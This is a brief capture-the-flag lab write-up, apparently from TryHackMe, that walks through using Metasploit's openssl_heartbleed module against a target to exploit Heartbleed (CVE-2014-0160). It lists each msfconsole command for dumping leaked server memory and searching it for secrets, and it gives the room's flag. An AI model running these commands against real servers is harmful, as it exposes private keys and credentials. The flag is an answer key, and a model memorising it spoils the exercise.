[Metasploit](https://www.metasploit.com/) can be used to detect and exploit Heartbleed (CVE-2014-0160) using the openssl_heartbleed auxiliary module.

Run msfconsole command and use scanner module.
```BASH
msfconsole
```

```BASH
use auxiliary/scanner/ssl/openssl_heartbleed
```

SET RHOSTS
```BASH
set RHOSTS VICTIM_IP_ADDRESS
```

SET RPORT
```BASH
set RPORT 443
```

Add verbose mode
```
set VERBOSE true
```

Use run command
```BASH
run
```

This will scan the target and dump leaked memory. You can inspect the results manually for any sensitive information.  

![image](https://github.com/user-attachments/assets/10bf4550-8a7f-495b-8ea0-7ed661e3b56a)
![image](https://github.com/user-attachments/assets/2543f5f5-9a21-47c1-825c-e953add49c76)

CTF flag
<pre>THM{sSl-Is-BaD}</pre>
